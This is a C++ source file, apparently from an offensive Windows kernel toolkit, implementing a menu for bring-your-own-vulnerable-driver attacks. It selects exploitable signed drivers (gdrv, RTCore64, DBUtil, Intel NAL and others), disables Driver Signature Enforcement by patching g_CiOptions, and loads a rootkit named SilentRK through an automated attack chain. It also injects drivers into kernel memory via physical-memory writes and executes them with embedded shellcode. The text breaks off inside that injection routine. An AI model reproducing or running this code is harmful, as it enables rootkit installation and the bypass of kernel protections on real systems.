/**
 * @file PocMenu.cpp
 * @author Gregory King
 * @date August 13, 2025
 * @brief This file contains the implementation of the PocMenu class.
 *
 * Implements the console menu interface, allowing the user to navigate
 * through options, select a vulnerable driver provider, and execute
 * kernel-level attacks and utilities.
 */

#include "PocMenu.h"
#include "PEParser.h"
#include "Providers/GdrvProvider.h" // Include concrete providers
#include "Providers/RTCoreProvider.h"
#include "Providers/DBUtilProvider.h"
#include "Providers/WinIoProvider.h"
#include "Providers/IntelPmxProvider.h"
//#include "Providers/ProcessHackerProvider.h"
#include "Providers/NeacSafe64Provider.h"
#include "Providers/IntelNalProvider.h"
#include "BYOVDManager.h"
#include <iostream>
#include <limits>
#include <iomanip>
#include <functional>
#include <vector>
#include <filesystem>
#include <fstream>
#include <algorithm>
#ifndef NOMINMAX
#define NOMINMAX
#endif
#include <windows.h>

#ifdef max
#undef max
#endif

namespace KernelMode {

    PocMenu::PocMenu() {
        serviceManager = std::make_unique<ServiceManager>(L"KernelModeService");
    }
    PocMenu::~PocMenu() {
        if (activeProvider) {
            activeProvider->Deinitialize();
        }
        // ServiceManager destructor handles cleanup
    }

    void PocMenu::DisplayBanner() {
        LOG_OUTPUT("====================================================\n");
        LOG_OUTPUT("         KernelMode - Advanced Windows Kernel Toolkit\n");
        LOG_OUTPUT("                      Author: Gregory King\n");
        LOG_OUTPUT("====================================================\n\n");
    }

    int PocMenu::GetUserChoice(int maxChoice) {
        int choice;
        std::cout << "> ";
        std::cin >> choice;

        if (std::cin.fail() || choice < 0 || choice > maxChoice) {
            std::cin.clear();
            std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
            LOG_OUTPUT("[-] Invalid choice. Please try again.\n");
            return -1;
        }
        // Clear potential leftover newline characters for getline
        if (std::cin.peek() == '\n') {
            std::cin.ignore();
        }
        return choice;
    }

    void PocMenu::SelectProvider() {
        if (activeProvider) {
            std::cout << "[!] A provider is already loaded. Deinitializing first.\n";
            activeProvider->Deinitialize();
            activeProvider.reset();
            dseManager.reset();
            manualMapper.reset();
        }

        std::cout << "\n--- Provider Selection ---\n";
        std::cout << "1. Gdrv (GIGABYTE gdrv.sys)\n";
        std::cout << "2. RTCore64 (Micro-Star RTCore64.sys)\n";
        std::cout << "3. DBUtil_2_3 (Dell DBUtil_2_3.sys)\n";
        std::cout << "4. WinIo (Yariv Kaplan WinIo.sys)\n";
        std::cout << "5. IntelPmx (Intel pmxdrv64.sys)\n";
        std::cout << "6. ProcessHacker (Wen Jia Liu kprocesshacker.sys)\n";
        std::cout << "7. NeacSafe64 (Neowiz NeacSafe64.sys)\n";
        std::cout << "8. Intel Nal (Intel iqvw64e.sys)\n";
        std::cout << "0. Back\n";

        int choice = GetUserChoice(8);

        switch (choice) {
        case 1:
            activeProvider = std::make_shared<Providers::GdrvProvider>();
            break;
        case 2:
            activeProvider = std::make_shared<Providers::RTCoreProvider>();
            break;
        case 3:
            activeProvider = std::make_shared<Providers::DBUtilProvider>();
            break;
        case 4:
            activeProvider = std::make_shared<Providers::WinIoProvider>();
            break;
        case 5:
            activeProvider = std::make_shared<Providers::IntelPmxProvider>();
            break;
        /*case 6: // Disabled - Implementation Missing
            activeProvider = std::make_shared<Providers::ProcessHackerProvider>();
            break;*/
        case 7:
            activeProvider = std::make_shared<Providers::NeacSafe64Provider>();
            break;
        case 8:
            activeProvider = std::make_shared<Providers::IntelNalProvider>();
            break;
        case 0:
            return; // Back
        default:
            std::cout << "[-] Invalid provider choice.\n";
            return;
        }

        if (activeProvider && !activeProvider->Initialize()) {
            std::cout << "[-] Failed to initialize the selected provider. Please ensure the driver is available and you are running as Administrator.\n";
            activeProvider.reset();
        }
        else if(activeProvider) {
            if (victim) {
                 auto rtProp = std::dynamic_pointer_cast<Providers::RTCoreProvider>(activeProvider);
                 if (rtProp) {
                     rtProp->SetVictimDetails(victim->GetDeviceName(), victim->GetDriverName());
                     std::wcout << L"[+] Linked already loaded Victim to Provider.\n";
                 }
            }
            dseManager = std::make_unique<DSE>(activeProvider.get());
            manualMapper = std::make_unique<ManualMapper>(activeProvider);
            std::cout << "[+] Provider loaded successfully.\n";
        }
    }

    void PocMenu::ProviderActionsMenu() {
        if (!activeProvider) {
            std::cout << "\n[-] No provider loaded. Please select a provider first.\n";
            return;
        }

        bool running = true;
        while (running) {
            std::cout << "\n--- Provider Actions Menu ---\n";
            std::cout << "1. DSE Operations\n";
            std::cout << "2. Manual Driver Mapping\n";
            std::cout << "0. Back to Main Menu\n";

            int choice = GetUserChoice(2);

            switch (choice) {
            case 1: HandleDseBypass(); break;
            case 2: HandleManualMap(); break;
            case 0: running = false; break;
            default: break;
            }
        }
    }

    void PocMenu::HandleDseBypass() {
        if (!dseManager) {
            std::cout << "[-] DSE Manager not initialized.\n";
            return;
        }
        std::cout << "\n--- DSE Operations ---\n";
        std::cout << "1. Disable DSE (Patch g_CiOptions)\n";
        std::cout << "2. Restore DSE\n";
        std::cout << "0. Back\n";

        int choice = GetUserChoice(2);
        switch (choice) {
        case 1: dseManager->Disable(); break;
        case 2: dseManager->Restore(); break;
        case 0: return;
        default: break;
        }
    }

    void PocMenu::HandlePeParser() {
        std::cout << "\n--- PE Parser ---\n";
        std::cout << "Enter the full path to the driver/PE file: ";
        std::wstring filePath;
        std::getline(std::wcin, filePath);

        if (filePath.empty()) {
            std::cout << "[-] No file path entered.\n";
            return;
        }

        if (filePath.front() == L'"' && filePath.back() == L'"') {
            filePath = filePath.substr(1, filePath.length() - 2);
        }

        PEParser parser(filePath);
        if (parser.Parse()) {
            parser.DisplayHeaders();
        }
    }

    void PocMenu::HandleManualMap() {
        if (!manualMapper) {
            std::cout << "[-] Manual Mapper not initialized.\n";
            return;
        }
        std::cout << "\n--- Manual Driver Mapping ---\n";
        std::cout << "Enter the full path to the 64-bit driver to map: ";
        std::wstring filePath;
        std::getline(std::wcin, filePath);

        if (filePath.empty()) {
            std::cout << "[-] No file path entered.\n";
            return;
        }

        if (filePath.front() == L'"' && filePath.back() == L'"') {
            filePath = filePath.substr(1, filePath.length() - 2);
        }

        manualMapper->MapDriver(filePath);
    }

    void PocMenu::HandleAutoLoadSilentRK() {
        
        LOG_OUTPUT("[*] Requesting BYOVD Manager to execute full attack chain...\n");
        LOG_OUTPUT("[*] Workflow: Vulnerable Driver -> DSE Bypass -> SilentRK Load\n");

        std::wstring silentRKPath = L"C:\\Users\\admin\\Documents\\Visual Studio 2022\\Projects\\SilentRK\\x64\\Debug\\SilentRK.sys";
        
        // Use the new BYOVDManager orchestrator
        auto& manager = KernelMode::BYOVD::BYOVDManager::GetInstance();
        
        KernelMode::BYOVD::BYOVDResult result = manager.LoadSilentRK(
            silentRKPath, 
            KernelMode::BYOVD::BYOVDMethod::DSEDisable
        );

        if (result == KernelMode::BYOVD::BYOVDResult::Success) {
            LOG_OUTPUT("\n[+] SilentRK Load Sequence: SUCCESS\n");
            LOG_OUTPUT("[+] The rootkit should now be active.\n");
        } else {
             LOG_OUTPUT("\n[-] SilentRK Load Sequence: FAILED\n");
             // Result codes are internal for now, but we could add a helper to stringify them
             LOG_OUTPUT("[-] Please check the logs above for detailed error information.\n");
        }
    }

    bool PocMenu::AttemptPhysicalMemoryMapping() {
        if (!activeProvider) {
            LOG_OUTPUT("[-] No provider available for physical memory mapping.\n");
            return false;
        }
        
        std::wstring providerName = activeProvider->GetProviderName();
        std::string providerNameStr(providerName.begin(), providerName.end());
        LOG_OUTPUT("[*] Attempting real physical memory mapping using provider: " << providerNameStr << "\n");
        
        // Check if provider supports physical memory access
        ULONG capabilities = activeProvider->GetCapabilities();
        if (!(capabilities & Providers::ProviderCapabilities::CAPABILITY_PHYSICAL_MEMORY)) {
            LOG_OUTPUT("[-] Provider does not support physical memory access.\n");
            return false;
        }
        
        LOG_OUTPUT("[+] Provider supports physical memory access\n");
        
        try {
            // Test 1: Read from low physical memory (typically safe region)
            LOG_OUTPUT("[*] Test 1: Reading from low physical memory (0x1000)...\n");
            uintptr_t testPhysAddr = 0x1000; // Test page at 4KB (usually safe)
            uint32_t readValue = 0;
            
            if (activeProvider->ReadPhysicalMemory(testPhysAddr, &readValue, sizeof(readValue))) {
                LOG_OUTPUT("[+] Successfully read from physical address 0x" << std::hex << testPhysAddr 
                          << ", value: 0x" << readValue << std::dec << "\n");
            } else {
                LOG_OUTPUT("[-] Failed to read from physical address 0x" << std::hex << testPhysAddr << std::dec << "\n");
            }
            
            // Test 2: Find and test KUSER_SHARED_DATA physical mapping
            LOG_OUTPUT("[*] Test 2: Testing KUSER_SHARED_DATA virtual-to-physical mapping...\n");
            uintptr_t kuserSharedData = 0xFFFFF78000000000ULL; // KUSER_SHARED_DATA virtual address
            uintptr_t kuserPhysical = activeProvider->VirtualToPhysical(kuserSharedData);
            
            if (kuserPhysical != 0) {
                LOG_OUTPUT("[+] KUSER_SHARED_DATA virtual->physical translation: 0x" << std::hex 
                          << kuserSharedData << " -> 0x" << kuserPhysical << std::dec << "\n");
                
                // Try to read the first DWORD from KUSER_SHARED_DATA via physical access
                uint32_t kuserValue = 0;
                if (activeProvider->ReadPhysicalMemory(kuserPhysical, &kuserValue, sizeof(kuserValue))) {
                    LOG_OUTPUT("[+] Successfully read KUSER_SHARED_DATA via physical memory: 0x" 
                              << std::hex << kuserValue << std::dec << "\n");
                } else {
                    LOG_OUTPUT("[-] Failed to read KUSER_SHARED_DATA via physical memory\n");
                }
            } else {
                LOG_OUTPUT("[-] Failed to translate KUSER_SHARED_DATA virtual address to physical\n");
            }
            
            // Test 3: Physical memory write test (if supported)
            LOG_OUTPUT("[*] Test 3: Testing physical memory write capabilities...\n");
            
            // Allocate a test buffer in kernel memory first
            uintptr_t testKernelAddr = activeProvider->AllocateKernelMemory(0x1000);
            if (testKernelAddr != 0) {
                LOG_OUTPUT("[+] Allocated test kernel memory at: 0x" << std::hex << testKernelAddr << std::dec << "\n");
                
                // Translate to physical address
                uintptr_t testPhysAddr = activeProvider->VirtualToPhysical(testKernelAddr);
                if (testPhysAddr != 0) {
                    LOG_OUTPUT("[+] Test kernel memory physical address: 0x" << std::hex << testPhysAddr << std::dec << "\n");
                    
                    // Write test pattern
                    uint32_t testPattern = 0xDEADBEEF;
                    if (activeProvider->WritePhysicalMemory(testPhysAddr, &testPattern, sizeof(testPattern))) {
                        LOG_OUTPUT("[+] Successfully wrote test pattern to physical memory\n");
                        
                        // Read back to verify
                        uint32_t readBack = 0;
                        if (activeProvider->ReadPhysicalMemory(testPhysAddr, &readBack, sizeof(readBack))) {
                            if (readBack == testPattern) {
                                LOG_OUTPUT("[+] Physical memory write/read verification successful!\n");
                                LOG_OUTPUT("[+] Written: 0x" << std::hex << testPattern 
                                          << ", Read: 0x" << readBack << std::dec << "\n");
                            } else {
                                LOG_OUTPUT("[-] Physical memory verification failed. Written: 0x" << std::hex 
                                          << testPattern << ", Read: 0x" << readBack << std::dec << "\n");
                            }
                        } else {
                            LOG_OUTPUT("[-] Failed to read back from physical memory for verification\n");
                        }
                    } else {
                        LOG_OUTPUT("[-] Failed to write to physical memory\n");
                    }
                } else {
                    LOG_OUTPUT("[-] Failed to translate test kernel memory to physical address\n");
                }
                
                // Clean up
                activeProvider->FreeKernelMemory(testKernelAddr, 0x1000);
                LOG_OUTPUT("[*] Cleaned up test kernel memory\n");
            } else {
                LOG_OUTPUT("[-] Failed to allocate test kernel memory\n");
            }
            
            // Test 4: Physical memory scanning test
            LOG_OUTPUT("[*] Test 4: Physical memory scanning capabilities...\n");
            
            // Scan a small range of physical memory looking for patterns
            uintptr_t scanStart = 0x10000; // Start at 64KB
            size_t scanSize = 0x10000;     // Scan 64KB
            size_t scanChunk = 0x1000;     // 4KB chunks
            
            LOG_OUTPUT("[*] Scanning physical memory range 0x" << std::hex << scanStart 
                      << " - 0x" << (scanStart + scanSize) << std::dec << "\n");
            
            std::vector<uint8_t> scanBuffer(scanChunk);
            size_t successfulReads = 0;
            
            for (uintptr_t addr = scanStart; addr < scanStart + scanSize; addr += scanChunk) {
                if (activeProvider->ReadPhysicalMemory(addr, scanBuffer.data(), scanChunk)) {
                    successfulReads++;
                    
                    // Look for interesting patterns (e.g., potential kernel structures)
                    for (size_t i = 0; i < scanChunk - 8; i += 8) {
                        uint64_t value = *reinterpret_cast<uint64_t*>(&scanBuffer[i]);
                        
                        // Look for potential kernel pointers (high addresses)
                        if (value >= 0xFFFF800000000000ULL && value < 0xFFFFFFFFFFFFFFFULL) {
                            LOG_OUTPUT("[*] Found potential kernel pointer at PA 0x" << std::hex 
                                      << (addr + i) << ": 0x" << value << std::dec << "\n");
                            break; // Only report first interesting value per chunk
                        }
                    }
                } 
                // Don't report failures for each chunk - some regions may be inaccessible
            }
            
            LOG_OUTPUT("[+] Physical memory scan completed. Successfully read " << successfulReads 
                      << " out of " << (scanSize / scanChunk) << " chunks\n");
            
            // Test 5: Provider-specific capabilities test
            LOG_OUTPUT("[*] Test 5: Testing provider-specific capabilities...\n");
            
            const Providers::ProviderLoadData* loadData = activeProvider->GetLoadData();
            if (loadData) {
                LOG_OUTPUT("[*] Provider capabilities:\n");
                LOG_OUTPUT("    - Physical Memory Bruteforce: " << (loadData->PhysMemoryBruteForce ? "YES" : "NO") << "\n");
                LOG_OUTPUT("    - PML4 From Low Stub: " << (loadData->PML4FromLowStub ? "YES" : "NO") << "\n");
                LOG_OUTPUT("    - Prefer Physical: " << (loadData->PreferPhysical ? "YES" : "NO") << "\n");
                LOG_OUTPUT("    - Requires DSE: " << (loadData->RequiresDSE ? "YES" : "NO") << "\n");
                LOG_OUTPUT("    - Description: " << loadData->Description << "\n");
            }
            
            LOG_OUTPUT("[+] Physical memory mapping technique validation completed successfully!\n");
            return true;
            
        } catch (const std::exception& e) {
            LOG_OUTPUT("[-] Exception during physical memory mapping test: " << e.what() << "\n");
            return false;
        }
    }

    bool PocMenu::FindSystemVulnerableDrivers() {
        LOG_OUTPUT("[*] Scanning system for installed vulnerable drivers...\n");
        
        // Common locations where vulnerable drivers might be installed
        std::vector<std::wstring> searchPaths = {
            L"C:\\Windows\\System32\\drivers\\",
            L"C:\\Windows\\SysWOW64\\drivers\\",
            L"C:\\Program Files\\",
            L"C:\\Program Files (x86)\\",
        };
        
        // Known vulnerable driver names to look for
        std::vector<std::wstring> vulnerableDrivers = {
            L"gdrv.sys", L"RTCore64.sys", L"DBUtil_2_3.sys",
            L"WinRing0x64.sys", L"msio64.sys", L"directio64.sys",
            L"physmem.sys", L"procexp.sys", L"kprocesshacker.sys"
        };
        
        for (const auto& path : searchPaths) {
            for (const auto& driver : vulnerableDrivers) {
                std::wstring fullPath = path + driver;
                WIN32_FIND_DATAW findData;
                HANDLE hFind = FindFirstFileW(fullPath.c_str(), &findData);
                if (hFind != INVALID_HANDLE_VALUE) {
                    FindClose(hFind);
                    LOG_OUTPUT("[+] Found system vulnerable driver: " << fullPath.c_str() << "\n");
                    // Try to use this driver
                    return true;
                }
            }
        }
        
        LOG_OUTPUT("[-] No system vulnerable drivers found.\n");
        return false;
    }

    bool PocMenu::AttemptDirectDSEBypass() {
        LOG_OUTPUT("[*] Attempting direct DSE bypass using advanced techniques...\n");
        
        // Real KDU-style driver extraction and loading
        if (ExtractAndLoadVulnerableDriver()) {
            LOG_OUTPUT("[+] Vulnerable driver extracted and loaded successfully!\n");
            return true;
        }
        
        LOG_OUTPUT("[-] Failed to extract and load vulnerable driver\n");
        return false;
    }
    
    bool PocMenu::ExtractAndLoadVulnerableDriver() {
        LOG_OUTPUT("[*] KDU-style driver extraction starting...\n");
        
        // Define available drivers (mimicking KDU's driver database)
        struct DriverEntry {
            std::wstring binFile;
            std::wstring sysFile;
            std::wstring driverName;
            std::wstring serviceName;
        };
        
        std::vector<DriverEntry> availableDrivers = {
            {L"drv\\gdrv.bin", L"gdrv.sys", L"Gdrv", L"gdrv"},
            {L"drv\\RTCore64.bin", L"RTCore64.sys", L"RTCore64", L"RTCore64"},
            {L"drv\\DbUtil2_3.bin", L"DbUtil_2_3.sys", L"DBUtil_2_3", L"DBUtil_2_3"},
            {L"drv\\NeacSafe64.bin", L"NeacSafe64.sys", L"NeacSafe64", L"NeacSafe64"}
        };
        
        for (const auto& driver : availableDrivers) {
            LOG_OUTPUT("[*] Attempting to extract: " << std::string(driver.driverName.begin(), driver.driverName.end()) << "\n");
            
            // Check if .bin file exists
            if (!std::filesystem::exists(driver.binFile)) {
                LOG_OUTPUT("[-] Driver binary not found: " << std::string(driver.binFile.begin(), driver.binFile.end()) << "\n");
                continue;
            }
            
            // Extract .bin to .sys file (KDU-style extraction)
            if (ExtractBinToSys(driver.binFile, driver.sysFile)) {
                LOG_OUTPUT("[+] Successfully extracted " << std::string(driver.driverName.begin(), driver.driverName.end()) << " to " << std::string(driver.sysFile.begin(), driver.sysFile.end()) << "\n");
                
                // Try to load the extracted signed driver
                if (LoadSignedDriver(driver.sysFile, driver.serviceName)) {
                    LOG_OUTPUT("[+] Successfully loaded signed driver: " << std::string(driver.driverName.begin(), driver.driverName.end()) << "\n");
                    return true;
                }
            }
        }
        
        return false;
    }
    
    bool PocMenu::ExtractBinToSys(const std::wstring& binPath, const std::wstring& sysPath) {
        LOG_OUTPUT("[*] Extracting " << std::string(binPath.begin(), binPath.end()) << " -> " << std::string(sysPath.begin(), sysPath.end()) << "\n");
        
        // Convert wide strings to narrow for file operations
        int size_needed = WideCharToMultiByte(CP_UTF8, 0, binPath.c_str(), -1, NULL, 0, NULL, NULL);
        std::string strBinPath(size_needed, 0);
        WideCharToMultiByte(CP_UTF8, 0, binPath.c_str(), -1, &strBinPath[0], size_needed, NULL, NULL);
        strBinPath.resize(size_needed - 1);
        
        size_needed = WideCharToMultiByte(CP_UTF8, 0, sysPath.c_str(), -1, NULL, 0, NULL, NULL);
        std::string strSysPath(size_needed, 0);
        WideCharToMultiByte(CP_UTF8, 0, sysPath.c_str(), -1, &strSysPath[0], size_needed, NULL, NULL);
        strSysPath.resize(size_needed - 1);
        
        // Read the .bin file (this is the signed PE driver)
        std::ifstream binFile(strBinPath, std::ios::binary);
        if (!binFile.is_open()) {
            LOG_OUTPUT("[-] Cannot open .bin file: " << strBinPath << "\n");
            return false;
        }
        
        // Get file size
        binFile.seekg(0, std::ios::end);
        std::streamsize binSize = binFile.tellg();
        binFile.seekg(0, std::ios::beg);
        
        // Read the entire .bin file (this is the signed driver data)
        std::vector<char> driverData(static_cast<size_t>(binSize));
        binFile.read(driverData.data(), binSize);
        binFile.close();
        
        LOG_OUTPUT("[+] Read " << binSize << " bytes from .bin file\n");
        
        // Write as .sys file (KDU extracts the signed PE driver)
        std::ofstream sysFile(strSysPath, std::ios::binary);
        if (!sysFile.is_open()) {
            LOG_OUTPUT("[-] Cannot create .sys file: " << strSysPath << "\n");
            return false;
        }
        
        sysFile.write(driverData.data(), binSize);
        sysFile.close();
        
        LOG_OUTPUT("[+] Successfully extracted signed driver to: " << strSysPath << "\n");
        return true;
    }
    
    bool PocMenu::LoadSignedDriver(const std::wstring& sysPath, const std::wstring& serviceName) {
        LOG_OUTPUT("[*] Loading signed driver via service manager...\n");
        
        // Get full path to the extracted driver
        wchar_t fullPath[MAX_PATH];
        if (!GetFullPathNameW(sysPath.c_str(), MAX_PATH, fullPath, NULL)) {
            LOG_OUTPUT("[-] Failed to get full path for driver\n");
            return false;
        }

        std::wstring displayName = serviceName + L" Description";
        ServiceInfo info = serviceManager->InstallDriverService(serviceName, fullPath, displayName);
        
        if (info.status == ServiceStatus::ERROR_STATE && !info.isOurService) {
             // Try to use existing? If InstallDriverService returns ERROR_STATE could mean OpenSCM failed
             // But if it exists, it returns what? 
             // My implementation of InstallDriverService returns status if it exists.
             // Wait, I need to check my implementation again.
             // InstallDriverService returns early if existing.
             LOG_OUTPUT("[-] Service installation failed or service state unknown.\n");
             // Fallback to trying to start it if it exists
             if (serviceManager->CheckServiceStatus(serviceName).status == ServiceStatus::NOT_FOUND) {
                 return false;
             }
        }

        if (serviceManager->StartDriverService(serviceName)) {
             LOG_OUTPUT("[+] Successfully started signed driver service!\n");
             return true;
        } else {
             LOG_OUTPUT("[-] Failed to start driver service.\n");
             return false;
        }
    }

    bool PocMenu::AttemptServiceBasedLoading(const std::wstring& driverPath) {
        LOG_OUTPUT("[*] Attempting standard service-based driver loading...\n");
        
        std::wstring serviceName = L"SilentRKService";

        // Using ServiceManager centralized logic
        ServiceInfo info = serviceManager->InstallDriverService(serviceName, driverPath, serviceName);
        
        // If installation failed but it might be because it exists, check status (handled inside Install loosely, but let's be robust)
        if (info.status == ServiceStatus::ERROR_STATE) {
            // Check if it exists
             if (serviceManager->CheckServiceStatus(serviceName).status == ServiceStatus::NOT_FOUND) {
                  LOG_OUTPUT("[-] Failed to create service or verify existence.\n");
                  return false;
             }
        }

        if (serviceManager->StartDriverService(serviceName)) {
            LOG_OUTPUT("[+] SilentRK service started successfully!\n");
            return true;
        } else {
            DWORD error = GetLastError();
             LOG_OUTPUT("[-] Failed to start SilentRK service. Error: " << error << "\n");
            if (error == 193) { // ERROR_BAD_EXE_FORMAT
                LOG_OUTPUT("    Error 193: DSE is blocking unsigned driver loading.\n");
            }
            return false;
        }
    }

    bool PocMenu::AttemptPhysicalMemoryInjection(const std::wstring& driverPath) {
        LOG_OUTPUT("[*] Attempting real physical memory injection technique...\n");
        
        if (!activeProvider) {
            LOG_OUTPUT("[-] No provider available for physical memory access.\n");
            return false;
        }
        
        // Check provider capabilities
        ULONG capabilities = activeProvider->GetCapabilities();
        if (!(capabilities & Providers::ProviderCapabilities::CAPABILITY_PHYSICAL_MEMORY)) {
            LOG_OUTPUT("[-] Provider does not support physical memory access required for injection.\n");
            return false;
        }
        
        std::wstring providerName2 = activeProvider->GetProviderName();
        std::string providerNameStr2(providerName2.begin(), providerName2.end());
        LOG_OUTPUT("[+] Provider supports physical memory access: " << providerNameStr2 << "\n");
        
        // Read the driver file
        int size_needed = WideCharToMultiByte(CP_UTF8, 0, driverPath.c_str(), -1, NULL, 0, NULL, NULL);
        std::string strDriverPath(size_needed, 0);
        WideCharToMultiByte(CP_UTF8, 0, driverPath.c_str(), -1, &strDriverPath[0], size_needed, NULL, NULL);
        strDriverPath.resize(size_needed - 1); // Remove null terminator
        
        std::ifstream file(strDriverPath, std::ios::binary | std::ios::ate);
        if (!file.is_open()) {
            LOG_OUTPUT("[-] Failed to open driver file for injection.\n");
            return false;
        }
        
        std::streamsize size = file.tellg();
        file.seekg(0, std::ios::beg);
        std::vector<char> driverData(static_cast<size_t>(size));
        file.read(driverData.data(), size);
        file.close();
        
        LOG_OUTPUT("[*] Driver file loaded (" << size << " bytes)\n");
        
        try {
            // Step 1: Allocate kernel memory for the driver
            LOG_OUTPUT("[*] Allocating kernel memory for driver injection...\n");
            
            size_t allocSize = (size + 0xFFF) & ~0xFFF; // Round up to page boundary
            uintptr_t kernelAddr = activeProvider->AllocateKernelMemory(allocSize);
            
            if (!kernelAddr) {
                LOG_OUTPUT("[-] Failed to allocate kernel memory for driver injection\n");
                return false;
            }
            
            LOG_OUTPUT("[+] Allocated kernel memory: 0x" << std::hex << kernelAddr 
                      << " (size: " << std::dec << allocSize << " bytes)\n");
            
            // Step 2: Get physical address of allocated memory
            uintptr_t physicalAddr = activeProvider->VirtualToPhysical(kernelAddr);
            if (!physicalAddr) {
                LOG_OUTPUT("[-] Failed to translate kernel virtual address to physical\n");
                activeProvider->FreeKernelMemory(kernelAddr, allocSize);
                return false;
            }
            
            LOG_OUTPUT("[+] Kernel memory physical address: 0x" << std::hex << physicalAddr << std::dec << "\n");
            
            // Step 3: Write driver data to physical memory
            LOG_OUTPUT("[*] Writing driver data to physical memory...\n");
            
            size_t bytesWritten = 0;
            const size_t chunkSize = 0x1000; // Write in 4KB chunks
            
            for (size_t offset = 0; offset < static_cast<size_t>(size); offset += chunkSize) {
                size_t writeSize = (std::min)(chunkSize, static_cast<size_t>(size) - offset);
                
                if (!activeProvider->WritePhysicalMemory(physicalAddr + offset, 
                                                        driverData.data() + offset, 
                                                        writeSize)) {
                    LOG_OUTPUT("[-] Failed to write driver chunk at offset 0x" << std::hex << offset << std::dec << "\n");
                    activeProvider->FreeKernelMemory(kernelAddr, allocSize);
                    return false;
                }
                
                bytesWritten += writeSize;
            }
            
            LOG_OUTPUT("[+] Successfully wrote " << bytesWritten << " bytes to physical memory\n");
            
            // Step 4: Verify the write by reading back
            LOG_OUTPUT("[*] Verifying driver injection by reading back data...\n");
            
            std::vector<char> verifyBuffer(static_cast<size_t>(size));
            size_t bytesVerified = 0;
            
            for (size_t offset = 0; offset < static_cast<size_t>(size); offset += chunkSize) {
                size_t readSize = (std::min)(chunkSize, static_cast<size_t>(size) - offset);
                
                if (!activeProvider->ReadPhysicalMemory(physicalAddr + offset,
                                                       verifyBuffer.data() + offset,
                                                       readSize)) {
                    LOG_OUTPUT("[-] Failed to read back driver chunk at offset 0x" << std::hex << offset << std::dec << "\n");
                    break;
                }
                
                bytesVerified += readSize;
            }
            
            if (bytesVerified == static_cast<size_t>(size)) {
                // Compare the data
                bool dataMatches = (memcmp(driverData.data(), verifyBuffer.data(), static_cast<size_t>(size)) == 0);
                if (dataMatches) {
                    LOG_OUTPUT("[+] Driver injection verification successful - data matches!\n");
                } else {
                    LOG_OUTPUT("[-] Driver injection verification failed - data corruption detected\n");
                    activeProvider->FreeKernelMemory(kernelAddr, allocSize);
                    return false;
                }
            } else {
                LOG_OUTPUT("[-] Driver injection verification incomplete\n");
                activeProvider->FreeKernelMemory(kernelAddr, allocSize);
                return false;
            }
            
            // Step 5: Parse PE headers to get entry point
            LOG_OUTPUT("[*] Parsing PE headers to locate driver entry point...\n");
            
            if (size < sizeof(IMAGE_DOS_HEADER)) {
                LOG_OUTPUT("[-] Driver file too small to contain valid PE headers\n");
                activeProvider->FreeKernelMemory(kernelAddr, allocSize);
                return false;
            }
            
            IMAGE_DOS_HEADER* dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(driverData.data());
            if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
                LOG_OUTPUT("[-] Invalid DOS signature in driver file\n");
                activeProvider->FreeKernelMemory(kernelAddr, allocSize);
                return false;
            }
            
            if (dosHeader->e_lfanew >= size || dosHeader->e_lfanew < 0) {
                LOG_OUTPUT("[-] Invalid PE header offset\n");
                activeProvider->FreeKernelMemory(kernelAddr, allocSize);
                return false;
            }
            
            IMAGE_NT_HEADERS* ntHeaders = reinterpret_cast<IMAGE_NT_HEADERS*>(
                driverData.data() + dosHeader->e_lfanew);
            
            if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
                LOG_OUTPUT("[-] Invalid PE signature in driver file\n");
                activeProvider->FreeKernelMemory(kernelAddr, allocSize);
                return false;
            }
            
            uintptr_t entryPointRVA = ntHeaders->OptionalHeader.AddressOfEntryPoint;
            uintptr_t entryPointVA = kernelAddr + entryPointRVA;
            uintptr_t entryPointPA = physicalAddr + entryPointRVA;
            
            LOG_OUTPUT("[+] Driver entry point located:\n");
            LOG_OUTPUT("    RVA: 0x" << std::hex << entryPointRVA << "\n");
            LOG_OUTPUT("    Virtual: 0x" << entryPointVA << "\n");
            LOG_OUTPUT("    Physical: 0x" << entryPointPA << std::dec << "\n");
            
            // Step 6: Create execution context for the driver
            LOG_OUTPUT("[*] Creating execution context for injected driver...\n");
            
            // Create shellcode to call the driver's entry point
            // This shellcode will call DriverEntry with proper parameters
            std::vector<uint8_t> executionShellcode = {
                // Driver execution shellcode
                0x48, 0x83, 0xEC, 0x28,                             // sub rsp, 28h
                0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00,         // mov rcx, 0 (DriverObject - will be patched)
                0x48, 0xC7, 0xC2, 0x00, 0x00, 0x00, 0x00,         // mov rdx, 0 (RegistryPath - will be patched)
                0x48, 0xB8                                          // mov rax, (entry point address)
            };
            
            // Append entry point address (8 bytes)
            uint8_t* entryPointBytes = reinterpret_cast<uint8_t*>(&entryPointVA);
            executionShellcode.insert(executionShellcode.end(), entryPointBytes, entryPointBytes + 8);
            
            // Complete shellcode
            std::vector<uint8_t> shellcodeEnd = {
                0xFF, 0xD0,                                         // call rax
                0x48, 0x83, 0xC4, 0x28,                            // add rsp, 28h
                0xC3                                                // ret
            };
            
            executionShellcode.insert(executionShellcode.end(), shellcodeEnd.begin(), shellcodeEnd.end());
            
            // Allocate memory for execution shellcode
            uintptr_t shellcodeAddr = activeProvider->AllocateKernelMemory(0x1000);
            if (!shellcodeAddr) {
                LOG_OUTPUT("[-] Failed to allocate memory for execution shellcode\n");
                activeProvider->FreeKernelMemory(kernelAddr, allocSize);
                return false;
            }
            
            // Write execution shellcode
            if (!activeProvider->WriteKernelMemory(shellcodeAddr, executionShellcode.data(), executionShellcode.size())) {
                LOG_OUTPUT("[-] Failed to write execution shellcode\n");
                activeProvider->FreeKernelMemory(kernelAddr, allocSize);
                activeProvider->FreeKernelMemory(shellcodeAddr, 0x1000);
                return false;
            }
            
            LOG_OUTPUT("[+] Execution shellcode prepared at: 0x" << std::hex << shellcodeAddr << std::dec << "\n");
            
            // Step 7: Execute the injected driver
            LOG_OUTPUT("[*] Executing injected driver entry point...\n");
            
            if (!activeProvider->CreateSystemThread(shellcodeAddr, 0)) {
                LOG_OUTPUT("[-] Failed to execute injected driver\n");
                activeProvider->FreeKernelMemory(kernelAddr, allocSize);
                activeProvider->FreeKernelMemory(shellcodeAddr, 0x1000);
                return false;
            }
            
            LOG_OUTPUT("[+] Driver execution initiated successfully!\n");
            
            // Give the driver time to initialize
            Sleep(1000);
            
            // Clean up execution shellcode but keep driver in memory
            activeProvider->FreeKernelMemory(shellcodeAddr, 0x1000);
            
            LOG_OUTPUT("[+] Physical memory injection completed successfully!\n");
